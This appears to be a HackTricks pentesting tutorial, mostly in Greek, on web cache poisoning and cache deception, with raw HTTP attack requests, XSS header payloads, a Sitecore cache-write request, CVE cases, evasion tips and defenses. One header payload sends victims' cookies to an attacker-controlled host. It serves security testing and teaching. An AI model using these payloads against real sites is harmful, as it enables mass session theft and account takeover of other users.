# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Η διαφορά

> **Ποια είναι η διαφορά μεταξύ web cache poisoning και web cache deception;**
>
> - Στο **web cache poisoning**, ο επιτιθέμενος προκαλεί στην εφαρμογή να αποθηκεύσει κακόβουλο περιεχόμενο στην cache, και αυτό το περιεχόμενο σερβίρεται από την cache σε άλλους χρήστες της εφαρμογής.
> - Στο **web cache deception**, ο επιτιθέμενος προκαλεί στην εφαρμογή να αποθηκεύσει ευαίσθητο περιεχόμενο που ανήκει σε άλλον χρήστη στην cache, και στη συνέχεια ο επιτιθέμενος ανακτά αυτό το περιεχόμενο από την cache.

## Cache Poisoning

Cache poisoning στοχεύει στο να χειραγωγήσει την client-side cache ώστε να εξαναγκάσει τους clients να φορτώσουν πόρους που είναι απρόσμενοι, μερικοί ή υπό τον έλεγχο ενός επιτιθέμενου. Η έκταση της επίπτωσης εξαρτάται από τη δημοφιλία της επηρεασμένης σελίδας, καθώς η μολυσμένη response σερβίρεται αποκλειστικά στους χρήστες που επισκέπτονται τη σελίδα κατά τη διάρκεια της περιόδου μόλυνσης της cache.

Η εκτέλεση μιας επίθεσης cache poisoning περιλαμβάνει αρκετά βήματα:

1. **Identification of Unkeyed Inputs**: Αυτές είναι παράμετροι που, αν και δεν απαιτούνται για να γίνει cache ένα request, μπορούν να αλλάξουν την response που επιστρέφει ο server. Ο εντοπισμός αυτών των inputs είναι κρίσιμος καθώς μπορούν να εκμεταλλευτούν για να χειραγωγήσουν την cache.
2. **Exploitation of the Unkeyed Inputs**: Αφού εντοπιστούν οι unkeyed inputs, το επόμενο βήμα είναι να βρεις πώς να κακοποιήσεις αυτές τις παραμέτρους για να τροποποιήσεις τη response του server με τρόπο ωφέλιμο για τον επιτιθέμενο.
3. **Ensuring the Poisoned Response is Cached**: Το τελικό βήμα είναι να εξασφαλίσεις ότι η χειραγωγημένη response αποθηκεύεται στην cache. Με αυτόν τον τρόπο, οποιοσδήποτε χρήστης προσπελάσει την επηρεασμένη σελίδα ενώ η cache είναι μολυσμένη θα λάβει τη μολυσμένη response.

### Ανακάλυψη: Check HTTP headers

Συνήθως, όταν μια response έχει **αποθηκευτεί στην cache** θα υπάρχει ένα **header που το υποδεικνύει**, μπορείς να ελέγξεις ποια headers πρέπει να προσέξεις σε αυτό το post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Ανακάλυψη: Caching error codes

Αν νομίζεις ότι η response αποθηκεύεται σε cache, μπορείς να δοκιμάσεις να **send requests with a bad header**, τα οποία θα πρέπει να απαντηθούν με **status code 400**. Έπειτα δοκίμασε να προσπελάσεις το request κανονικά και αν η **response είναι status code 400**, ξέρεις ότι είναι ευάλωτο (και θα μπορούσες ακόμα και να εκτελέσεις ένα DoS).

Μπορείς να βρεις περισσότερες επιλογές στο:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Ωστόσο, σημείωσε ότι **μερικές φορές αυτού του είδους οι status codes δεν αποθηκεύονται στην cache**, οπότε αυτό το τεστ μπορεί να μην είναι αξιόπιστο.

### Ανακάλυψη: Identify and evaluate unkeyed inputs

Μπορείς να χρησιμοποιήσεις [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) για να **brute-force parameters and headers** που μπορεί να **αλλάζουν την response της σελίδας**. Για παράδειγμα, μια σελίδα μπορεί να χρησιμοποιεί το header `X-Forwarded-For` για να υποδείξει στον client να φορτώσει το script από εκεί:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicit a harmful response from the back-end server

Μετά τον εντοπισμό της παράμετρου/κεφαλίδας, ελέγξτε πώς **φιλτράρεται** και **πού** **αντανακλάται** ή επηρεάζει την απόκριση από την κεφαλίδα. Μπορείτε να το καταχραστείτε (εκτελέσετε XSS ή φορτώσετε JS που ελέγχετε; προκαλέσετε DoS;...)

### Get the response cached

Μόλις έχετε **εντοπίσει** τη **σελίδα** που μπορεί να καταχραστεί, ποια **παράμετρος**/**κεφαλίδα** να χρησιμοποιήσετε και **πώς** να την **καταχραστείτε**, πρέπει να βάλετε τη σελίδα στην cache. Ανάλογα με τον πόρο που προσπαθείτε να βάλτε στην cache αυτό μπορεί να πάρει λίγο χρόνο, ίσως χρειαστεί να προσπαθείτε για αρκετά δευτερόλεπτα.

Η κεφαλίδα **`X-Cache`** στην απόκριση μπορεί να είναι πολύ χρήσιμη καθώς μπορεί να έχει την τιμή **`miss`** όταν το request δεν είχε cache και την τιμή **`hit`** όταν είναι cached.\
Η κεφαλίδα **`Cache-Control`** είναι επίσης ενδιαφέρουσα για να γνωρίζετε αν ένας resource cacheάρεται και πότε θα γίνει η επόμενη cache: `Cache-Control: public, max-age=1800`

Μια ακόμα ενδιαφέρουσα κεφαλίδα είναι η **`Vary`**. Αυτή η κεφαλίδα συχνά χρησιμοποιείται για να **υποδείξει επιπλέον κεφαλίδες** που θεωρούνται **μέρος του cache key** ακόμα κι αν συνήθως δεν είναι keyed. Επομένως, αν ο χρήστης γνωρίζει το `User-Agent` του θύματος που στοχεύει, μπορεί να poison the cache για τους χρήστες που χρησιμοποιούν αυτό το συγκεκριμένο `User-Agent`.

Άλλη μία κεφαλίδα σχετική με την cache είναι η **`Age`**. Ορίζει τον χρόνο σε δευτερόλεπτα που το αντικείμενο βρίσκεται στην proxy cache.

Όταν κάνετε cache ένα request, να είστε **προσεκτικοί με τις κεφαλίδες που χρησιμοποιείτε** γιατί μερικές απ' αυτές θα μπορούσαν να **χρησιμοποιηθούν απροσδόκητα** ως **μέρος του cache key** και το **θύμα θα χρειαστεί να χρησιμοποιήσει την ίδια κεφαλίδα**. Πάντα **δοκιμάζετε** ένα Cache Poisoning με **διαφορετικά προγράμματα περιήγησης** για να ελέγξετε αν λειτουργεί.

## Exploiting Examples

### Easiest example

Μια κεφαλίδα όπως η `X-Forwarded-For` αντανακλάται στην απόκριση χωρίς φιλτράρισμα.\
Μπορείτε να στείλετε ένα βασικό XSS payload και poison the cache ώστε όποιος επισκέπτεται τη σελίδα να υποστεί XSS:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Σημειώστε ότι αυτό θα poison ένα request προς `/en?region=uk` και όχι προς `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

Στο **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** εξηγείται το ακόλουθο απλό σενάριο:

- Το CDN θα αποθηκεύει στην cache οτιδήποτε κάτω από `/share/`
- Το CDN ΔΕΝ θα αποκωδικοποιήσει ούτε θα κανονικοποιήσει το `%2F..%2F`, επομένως μπορεί να χρησιμοποιηθεί ως **path traversal to access other sensitive locations that will be cached** όπως `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Ο web server ΘΑ αποκωδικοποιήσει και θα κανονικοποιήσει το `%2F..%2F`, και θα απαντήσει με `/api/auth/session`, το οποίο **contains the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Τα Cookies μπορούν επίσης να αντανακλώνται στην απόκριση μιας σελίδας. Αν μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε, για παράδειγμα, μια XSS, θα μπορούσατε να εκμεταλλευτείτε την XSS σε αρκετούς clients που φορτώνουν την κακόβουλη απόκριση της cache.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Σημειώστε ότι αν το ευάλωτο cookie χρησιμοποιείται πολύ από τους χρήστες, τα τακτικά αιτήματα θα καθαρίζουν το cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Δείτε:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning με path traversal για να κλέψετε API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) πώς ήταν δυνατό να κλαπεί ένα OpenAI API key με ένα URL όπως `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` επειδή οτιδήποτε που ταιριάζει με `/share/*` θα αποθηκεύεται στο cache χωρίς το Cloudflare να ομαλοποιεί το URL, κάτι που γινόταν όταν το αίτημα έφτανε στον web server.

Αυτό εξηγείται καλύτερα και στο:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Μερικές φορές θα χρειαστεί να **exploit several unkeyed inputs** για να μπορέσετε να καταχραστείτε το cache. Για παράδειγμα, μπορεί να βρείτε ένα **Open redirect** αν ορίσετε το `X-Forwarded-Host` σε ένα domain που ελέγχετε και το `X-Forwarded-Scheme` σε `http`. **Αν** ο **server** **προωθεί** όλα τα **HTTP** αιτήματα **σε HTTPS** και χρησιμοποιεί την κεφαλίδα `X-Forwarded-Scheme` ως το domain name για την ανακατεύθυνση, μπορείτε να ελέγξετε προς ποια διεύθυνση δείχνει η σελίδα μέσω της ανακατεύθυνσης.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Εκμετάλλευση με περιορισμένο `Vary`header

Αν διαπιστώσεις ότι το **`X-Host`** header χρησιμοποιείται ως **όνομα domain για τη φόρτωση ενός JS resource** αλλά το **`Vary`** header στην απάντηση υποδεικνύει **`User-Agent``. Τότε χρειάζεται να βρεις τρόπο να exfiltrate τον `User-Agent` του victim και να poison την cache χρησιμοποιώντας αυτόν τον user agent:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Στείλε ένα GET αίτημα με τα δεδομένα τόσο στο URL όσο και στο σώμα. Αν ο web server χρησιμοποιεί αυτά από το σώμα, αλλά ο cache server κάνει cache αυτά από το URL, οποιοσδήποτε που προσπελάσει αυτό το URL θα χρησιμοποιήσει στην πραγματικότητα την παράμετρο από το σώμα. Όπως το vuln που βρήκε ο James Kettle στο Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Υπάρχει ένα PortSwigger lab γι' αυτό: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Για παράδειγμα, είναι δυνατόν να διαχωριστούν οι **parameters** σε ruby servers χρησιμοποιώντας τον χαρακτήρα **`;`** αντί για **`&`**. Αυτό μπορεί να χρησιμοποιηθεί για να τοποθετήσετε τιμές μη-κλειδωμένων parameters μέσα σε κλειδωμένα και να τα εκμεταλλευτείτε.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Μάθετε εδώ πώς να πραγματοποιήσετε [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

Το [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) μπορεί να χρησιμοποιηθεί για αυτόματο έλεγχο για web cache poisoning. Υποστηρίζει πολλές διαφορετικές τεχνικές και είναι ιδιαίτερα παραμετροποιήσιμο.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Αυτό το μοτίβο από πραγματικά περιβάλλοντα συνδέει ένα header-based reflection primitive με τη συμπεριφορά ενός CDN/WAF για να δηλητηριάσει αξιόπιστα το cached HTML που σερβίρεται σε άλλους χρήστες:

- Το κύριο HTML αντέστρεφε ένα μη-έμπιστο request header (π.χ., `User-Agent`) σε εκτελέσιμο context.
- Το CDN αφαίρεσε τα cache headers αλλά υπήρχε εσωτερικό/origin cache. Το CDN επίσης auto-cached requests που τελειώνουν σε static extensions (π.χ., `.js`), ενώ το WAF εφάρμοζε ασθενέστερο content inspection για GETs στα static assets.
- Ατέλειες στη ροή των requests επέτρεψαν σε ένα αίτημα προς μονοπάτι `.js` να επηρεάσει το cache key/variant που χρησιμοποιήθηκε για το επόμενο main HTML, επιτρέποντας cross-user XSS μέσω header reflection.

Practical recipe (observed across a popular CDN/WAF):

1) Από ένα clean IP (αποφύγετε προηγούμενες ποινές βάσει reputation), ορίστε ένα malicious `User-Agent` μέσω browser ή Burp Proxy Match & Replace.  
2) Στο Burp Repeater, προετοιμάστε ένα group δύο requests και χρησιμοποιήστε "Send group in parallel" (το single-packet mode δουλεύει καλύτερα):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
- Immediately after: GET the main page (`/`).  
3) Ο αγώνας δρομολόγησης CDN/WAF μαζί με το auto-cached `.js` συχνά σπέρνει ένα poisoned cached HTML variant που στη συνέχεια σερβίρεται σε άλλους επισκέπτες που μοιράζονται τις ίδιες συνθήκες cache key (π.χ., ίδιες `Vary` διαστάσεις όπως `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.

Defenses:

- Stop reflecting request headers into HTML; strictly context-encode if unavoidable. Align CDN and origin cache policies and avoid varying on untrusted headers.
- Ensure WAF applies content inspection consistently to `.js` requests and static paths.
- Set `HttpOnly` (and `Secure`, `SameSite`) on session cookies.

### Sitecore pre‑auth HTML cache poisoning (μη ασφαλής XAML Ajax reflection)

Ένα μοτίβο ειδικό για Sitecore επιτρέπει μη αυθεντικοποιημένες εγγραφές στο HtmlCache εκμεταλλευόμενο pre‑auth XAML handlers και AjaxScriptManager reflection. Όταν ο handler `Sitecore.Shell.Xaml.WebControl` προσεγγίζεται, ένα `xmlcontrol:GlobalHeader` (παράγωγο του `Sitecore.Web.UI.WebControl`) είναι διαθέσιμο και η ακόλουθη reflective κλήση επιτρέπεται:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Αυτό γράφει αυθαίρετο HTML κάτω από ένα attacker‑chosen cache key, επιτρέποντας ακριβές poisoning μόλις τα cache keys γίνουν γνωστά.

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Ευάλωτα Παραδείγματα

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

Το ATS προώθησε το fragment μέσα στο URL χωρίς να το αφαιρέσει και δημιούργησε το cache key χρησιμοποιώντας μόνο το host, path και query (αγνοώντας το fragment). Έτσι το αίτημα `/#/../?r=javascript:alert(1)` στάλθηκε στο backend ως `/#/../?r=javascript:alert(1)` και το cache key δεν περιείχε το payload, μόνο host, path και query.

### GitHub CP-DoS

Η αποστολή μη έγκυρης τιμής στο header content-type προκάλεσε ένα 405 cached response. Το cache key περιείχε το cookie, οπότε ήταν δυνατό να επιτεθεί κανείς μόνο σε unauth users.

### GitLab + GCP CP-DoS

Το GitLab χρησιμοποιεί GCP buckets για αποθήκευση static content. **GCP Buckets** υποστηρίζουν το **header `x-http-method-override`**. Έτσι ήταν δυνατό να σταλεί το header `x-http-method-override: HEAD` και να poison the cache ώστε να επιστρέψει κενό response body. Μπορεί επίσης να υποστηρίζει τη μέθοδο `PURGE`.

### Rack Middleware (Ruby on Rails)

Σε εφαρμογές Ruby on Rails χρησιμοποιείται συχνά το Rack middleware. Ο σκοπός του Rack είναι να πάρει την τιμή του header **`x-forwarded-scheme`** και να την θέσει ως scheme του request. Όταν σταλεί το header `x-forwarded-scheme: http`, γίνεται 301 redirect στην ίδια τοποθεσία, ενδεχομένως προκαλώντας Denial of Service (DoS) σε αυτόν τον πόρο. Επιπλέον η εφαρμογή μπορεί να αναγνωρίσει το header `X-forwarded-host` και να κάνει redirect τους χρήστες στον συγκεκριμένο host. Αυτή η συμπεριφορά μπορεί να οδηγήσει στο φόρτωμα JavaScript αρχείων από server του attacker, δημιουργώντας κίνδυνο ασφάλειας.

### 403 and Storage Buckets

Το Cloudflare παλαιότερα cached 403 responses. Η προσπάθεια πρόσβασης σε S3 ή Azure Storage Blobs με λανθασμένα Authorization headers προκαλούσε 403 response που μπήκε στην cache. Αν και το Cloudflare έχει σταματήσει να cache-άρει 403 responses, αυτή η συμπεριφορά μπορεί να υπάρχει ακόμα σε άλλες proxy υπηρεσίες.

### Injecting Keyed Parameters

Οι caches συχνά συμπεριλαμβάνουν συγκεκριμένες GET παραμέτρους στο cache key. Για παράδειγμα, η Varnish του Fastly cached την παράμετρο `size` στα requests. Ωστόσο, αν μια URL-encoded έκδοση της παραμέτρου (π.χ. `siz%65`) σταλεί επίσης με λανθασμένη τιμή, το cache key θα χτιστεί χρησιμοποιώντας την σωστή παράμετρο `size`. Παρ' όλα αυτά, το backend θα επεξεργαστεί την τιμή στην URL-encoded παράμετρο. Η URL-encoding της δεύτερης `size` παραμέτρου οδηγούσε στην παράβλεψή της από την cache αλλά στη χρήση της από το backend. Η ανάθεση τιμής 0 σε αυτήν την παράμετρο είχε ως αποτέλεσμα ένα cacheable 400 Bad Request error.

### User Agent Rules

Κάποιοι developers μπλοκάρουν αιτήματα με user-agents που ταιριάζουν σε εργαλεία υψηλής κυκλοφορίας όπως FFUF ή Nuclei για να διαχειριστούν το φόρτο του server. Ειρωνικά, αυτή η προσέγγιση μπορεί να εισάγει ευπάθειες όπως cache poisoning και DoS.

### Illegal Header Fields

Το [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) καθορίζει τους αποδεκτούς χαρακτήρες στα ονόματα header. Headers που περιέχουν χαρακτήρες εκτός του καθορισμένου εύρους **tchar** θα έπρεπε ιδανικά να προκαλούν 400 Bad Request response. Στην πράξη, οι servers δεν συμμορφώνονται πάντα με αυτό το πρότυπο. Ένα αξιοσημείωτο παράδειγμα είναι η Akamai, που προωθεί headers με μη έγκυρους χαρακτήρες και cache-άρει οποιοδήποτε 400 error, εφόσον δεν υπάρχει το header `cache-control`. Ένα εκμεταλλεύσιμο pattern εντοπίστηκε όπου η αποστολή ενός header με παράνομο χαρακτήρα, όπως `\`, θα είχε ως αποτέλεσμα ένα cacheable 400 Bad Request error.

### Εύρεση νέων headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Καταρχάς να σημειωθεί ότι επεκτάσεις όπως `.css`, `.js`, `.png` κ.λπ. συνήθως είναι ρυθμισμένες να αποθηκεύονται στην cache. Επομένως, αν επισκεφθείτε `www.example.com/profile.php/nonexistent.js`, η cache πιθανότατα θα αποθηκεύσει το response επειδή εντοπίζει την `.js` επέκταση. Όμως, αν η εφαρμογή επιστρέψει τα ευαίσθητα περιεχόμενα χρήστη που βρίσκονται στο _www.example.com/profile.php_, μπορείτε να κλέψετε αυτά τα περιεχόμενα από άλλους χρήστες.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Στο παράδειγμα εξηγείται ότι αν φορτώσετε μια μη-υπάρχουσα σελίδα όπως _http://www.example.com/home.php/non-existent.css_ το περιεχόμενο του _http://www.example.com/home.php_ (με τις ευαίσθητες πληροφορίες του χρήστη) θα επιστραφεί και ο cache server θα αποθηκεύσει το αποτέλεσμα.\
Στη συνέχεια, ο **attacker** μπορεί να προσπελάσει _http://www.example.com/home.php/non-existent.css_ στον δικό του browser και να δει τις **εμπιστευτικές πληροφορίες** των χρηστών που επισκέφτηκαν προηγουμένως.

Σημειώστε ότι ο **cache proxy** θα πρέπει να είναι **configured** να cache-άρει αρχεία βάσει της επέκτασης του αρχείου (_.css_) και όχι βάσει του content-type. Στο παράδειγμα _http://www.example.com/home.php/non-existent.css_ το content-type θα είναι `text/html` αντί για `text/css` mime type.

Μάθετε εδώ πώς να πραγματοποιήσετε [Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Αυτόματα Εργαλεία

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner για να βρει web cache poisoning vulnerabilities σε μια λίστα URL και να δοκιμάσει πολλαπλές τεχνικές injection.

## Αναφορές

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
